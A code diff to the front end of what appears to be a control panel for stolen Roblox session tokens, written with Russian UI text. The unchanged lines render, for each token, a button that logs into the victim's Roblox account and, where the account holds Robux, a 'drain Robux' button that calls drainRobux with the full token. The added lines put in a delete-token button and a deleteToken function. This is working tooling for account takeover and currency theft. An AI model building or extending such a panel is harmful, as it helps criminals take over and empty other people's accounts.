@@ -130,7 +130,10 @@ function renderTokens() {
     }
     
     if (t.security) {
-      html += '<button class="' + loginClass + '" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')">' + loginBtnText + '</button>';
+      html += '<div style="display:flex; gap:8px;">';
+      html += '<button class="' + loginClass + '" style="flex:1;" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')">' + loginBtnText + '</button>';
+      html += '<button class="btn-secondary" title="Удалить токен" style="width:auto; padding:0 12px; border-color: rgba(255, 0, 85, 0.3); color: var(--danger); background: rgba(255, 0, 85, 0.05);" onclick="deleteToken(\'' + fileId.replace(/'/g, "\\'") + '\')">🗑️</button>';
+      html += '</div>';
       if (valid && t.robux !== undefined && t.robux > 0) {
         html += '<button class="btn-secondary" style="margin-top:0.5rem; width:100%; color: #10b981; border-color: rgba(16, 185, 129, 0.3); background: rgba(16, 185, 129, 0.05);" onclick="drainRobux(\'' + tokenFull.replace(/'/g, "\\'") + '\', this)">💸 Слить Robux</button>';
       }
@@ -320,3 +323,18 @@ document.getElementById('btnSortLogin').addEventListener('click', function() {
 });
 
 loadTokens();
+
+async function deleteToken(fileId) {
+  if (!confirm('Вы уверены, что хотите удалить этот токен?')) return;
+  try {
+    const r = await apiFetch('/files/' + encodeURIComponent(fileId), { method: 'DELETE' });
+    if (r.ok) {
+      toast('Токен удален', 'success');
+      loadTokens();
+    } else {
+      toast('Ошибка удаления', 'err');
+    }
+  } catch (e) {
+    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
+  }
+}
